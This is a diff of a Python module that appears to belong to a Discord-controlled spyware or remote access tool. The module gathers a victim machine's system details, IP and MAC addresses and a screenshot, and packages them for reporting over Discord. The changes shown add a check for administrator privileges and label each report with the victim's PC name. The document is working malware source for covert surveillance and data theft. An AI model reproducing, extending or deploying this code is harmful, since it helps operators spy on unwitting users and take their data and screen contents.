@@ -5,8 +5,15 @@ import requests
 import discord
 from PIL import ImageGrab
 import io
+import ctypes
 
 async def start_messagesend(bot, guild):
+    def is_admin():
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
+
     def get_ip_addresses():
         private_ip = socket.gethostbyname(socket.gethostname())
         try:
@@ -31,7 +38,8 @@ async def start_messagesend(bot, guild):
             'Version': uname.version,
             'Machine': uname.machine,
             'Processor': uname.processor,
-            'RAM': f"{round(psutil.virtual_memory().total / 1024 ** 3)} GB"
+            'RAM': f"{round(psutil.virtual_memory().total / 1024 ** 3)} GB",
+            'Admin': 'Yes' if is_admin() else 'No'
         }
 
     def take_screenshot():
@@ -46,9 +54,11 @@ async def start_messagesend(bot, guild):
         private_ip, public_ip = get_ip_addresses()
         mac_address = get_mac_address()
 
+        pc_name = socket.gethostname()
+
         embed = discord.Embed(
             title='System Information',
-            description=f"Extensive system information for guild: **{guild_name}**",
+            description=f"Extensive system information for user: **{pc_name}**",
             color=16734003
         )
         embed.add_field(name='💻 System', value=system_info['System'], inline=True)
@@ -61,6 +71,7 @@ async def start_messagesend(bot, guild):
         embed.add_field(name='🔒 MAC Address', value=mac_address, inline=True)
         embed.add_field(name='🔐 Private IP', value=private_ip, inline=True)
         embed.add_field(name='🌐 Public IP', value=public_ip, inline=True)
+        embed.add_field(name='🔑 Run as Admin', value=system_info['Admin'], inline=True)
         embed.set_image(url='attachment://screenshot.png')
 
         return embed
